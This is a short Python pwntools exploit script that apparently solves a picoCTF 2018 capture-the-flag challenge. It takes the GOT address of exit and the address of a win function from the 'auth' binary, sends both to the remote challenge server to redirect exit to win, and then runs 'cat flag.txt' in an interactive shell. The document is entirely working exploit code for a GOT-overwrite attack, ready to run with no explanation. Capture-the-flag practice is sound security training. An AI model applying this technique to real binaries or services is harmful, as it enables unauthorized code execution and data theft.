from pwn import *

auth=ELF("./auth")
got=str(hex(auth.got['exit']))
win=str(hex(auth.symbols['win']))
print got,win
port=int(input("please enter  your port: "))
s=remote("2018shell.picoctf.com", port)
s.recv()
s.sendline(got)
s.recvline()
s.sendline(win)
s.recvline()
s.sendline("cat flag.txt")
s.interactive()
